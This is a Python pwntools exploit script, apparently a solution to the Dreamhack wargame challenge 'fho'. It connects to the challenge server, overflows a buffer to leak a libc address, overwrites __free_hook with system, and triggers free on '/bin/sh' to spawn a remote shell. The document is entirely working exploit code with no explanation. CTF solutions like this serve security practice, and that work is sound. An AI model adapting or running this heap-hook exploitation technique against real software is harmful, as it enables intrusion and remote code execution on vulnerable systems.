# Name: fho.py

from pwn import *

HOST = 'host3.dreamhack.games'
PORT = 8204

# conn = process('./fho') # local
conn = remote(HOST, PORT)

e = ELF('./fho')
libc = ELF('./libc-2.27.so')

# leak libc base
buf = b'A' * 0x48
conn.sendafter(b'Buf: ', buf)
conn.recvuntil(buf)
libc_start_main_231 = u64(conn.recvline()[:-1] + b'\x00' * 2)
libc_base = libc_start_main_231 - libc.sym['__libc_start_main'] - 231
system = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']
binsh = libc_base + next(libc.search(b'/bin/sh'))

# overwrite `__free_hook` with `system`
conn.recvuntil(b'To write: ')
conn.sendline(str(free_hook).encode())
conn.recvuntil(b'With: ')
conn.sendline(str(system).encode())

# exploit
conn.recvuntil(b'To free: ')
conn.sendline(str(binsh).encode())

conn.interactive()